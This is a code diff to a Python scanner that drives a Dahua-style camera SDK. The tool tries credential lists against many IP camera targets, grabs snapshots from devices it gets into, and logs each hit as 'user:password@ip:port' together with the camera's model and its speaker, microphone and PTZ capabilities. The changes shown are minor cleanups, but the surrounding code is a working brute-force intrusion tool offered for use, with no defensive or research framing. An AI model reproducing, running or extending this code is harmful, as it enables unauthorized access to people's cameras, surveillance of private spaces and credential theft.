@@ -11,7 +11,6 @@ import platform
 import re
 from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
 
-# --- ANSI COLORS ---
 COLORS = {
     "lightblue": "\033[94m",
     "lightgray": "\033[37m",
@@ -26,7 +25,6 @@ def cprint(color_name, msg, end="\n"):
     sys.stdout.write(f"{color}{msg}{COLORS['reset']}{end}")
     sys.stdout.flush()
 
-# --- SDK STRUCTURES & CONSTANTS ---
 C_LLONG = ctypes.c_longlong
 C_DWORD = ctypes.c_ulong
 DH_DEV_SYS_ATTR = 0x0001
@@ -123,7 +121,6 @@ class NET_OUT_LOGIN_WITH_HIGHLEVEL_SECURITY(ctypes.Structure):
 class SNAP_PARAMS(ctypes.Structure):
     _fields_ = [("Channel", ctypes.c_uint32), ("Quality", ctypes.c_uint32), ("ImageSize", ctypes.c_uint32), ("mode", ctypes.c_uint32), ("WaitTime", ctypes.c_uint32), ("Reserved", ctypes.c_uint32 * 2)]
 
-# --- GLOBALS & LOCKS ---
 sdk = None
 debug_enabled = False
 session_lock = threading.Lock()
@@ -215,17 +212,13 @@ def get_device_info(login_id):
         ret_len = ctypes.c_int(0)
         ptz_cfg_res = sdk.CLIENT_GetDevConfig(C_LLONG(login_id), DH_DEV_PTZ_CFG, -1, ctypes.byref(ptz_cfg_buf), ctypes.sizeof(ptz_cfg_buf), ctypes.byref(ret_len), 3000)
         
-        ptz_cmd_res = sdk.CLIENT_PTZControl(C_LLONG(login_id), 0, 4, 0, 0, 0, 0) # ZOOM_ADD_CONTROL = 4
-        if ptz_cmd_res:
-            sdk.CLIENT_PTZControl(C_LLONG(login_id), 0, 4, 0, 0, 0, 1) # Stop = 1
-
         ptz_heuristic = False
         if model.upper().startswith("SD") or "PTZ" in model.upper() or "DOME" in model.upper():
             ptz_heuristic = True
 
-        ptz = True if (ptz_res or ptz_cfg_res or ptz_cmd_res or ptz_heuristic) else False
+        ptz = True if (ptz_res or ptz_cfg_res or ptz_heuristic) else False
         
-        debug_log(f"ID {login_id} - Model: {model} | S:{speaker} M:{mic} P:{ptz} (L:{bool(ptz_res)} C:{bool(ptz_cfg_res)} Q:{bool(ptz_cmd_res)} H:{ptz_heuristic})")
+        debug_log(f"ID {login_id} - Model: {model} | S:{speaker} M:{mic} P:{ptz} (L:{bool(ptz_res)} C:{bool(ptz_cfg_res)} H:{ptz_heuristic})")
         return model, speaker, mic, ptz
     except Exception as e:
         debug_log(f"Info retrieval failed for ID {login_id}: {e}")
@@ -282,8 +275,7 @@ def attempt_login(ip, port, user, password, output_dir):
             if snap_ok:
                 debug_log(f"Snapshot saved for {ip}")
                 with res_file_lock:
-                    res_path = os.path.join(output_dir, "results.txt")
-                    with open(res_path, "a") as rf:
+                    with open(os.path.join(output_dir, "results.txt"), "a") as rf:
                         rf.write(f"{user}:{password}@{ip}:{port} [{model}] [{capabilities.replace(':', '_')}]\n")
             else:
                 debug_log(f"Snapshot failed for {ip} (all methods)")
@@ -319,7 +311,6 @@ def process_target(ip, port, credentials, output_dir):
     with stats_lock: stats["scanned"] += 1
     return success
 
-# --- UI LOGIC ---
 def format_progress(scanned, found, total, width=48):
     percent = int((scanned / total) * 100) if total else 0
     filled = int((scanned / total) * width) if total else 0
@@ -452,8 +443,6 @@ def main():
         sdk = load_sdk()
         sdk.CLIENT_LoginWithHighLevelSecurity.restype = C_LLONG
         sdk.CLIENT_Login.restype = C_LLONG
-        sdk.CLIENT_PTZControl.argtypes = [C_LLONG, ctypes.c_int, ctypes.c_uint, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int]
-        sdk.CLIENT_PTZControl.restype = ctypes.c_int
         sdk.CLIENT_Init(None, None); sdk.CLIENT_SetSnapRevCallBack(c_snap_callback, 0)
     except Exception as e: cprint("lightred", f"[!] SDK Initialization failed: {e}"); return
     
@@ -492,10 +481,6 @@ def main():
             now = time.time()
             if now - last_update >= 0.1 and not interrupted_by_user:
                 print_progress_once(); last_update = now
-        
-        if not stop_event.is_set():
-            debug_log("Waiting for final threads to complete...")
-            wait(running)
                 
     if not interrupted_by_user:
         print_progress_once(); sys.stdout.write('\n')
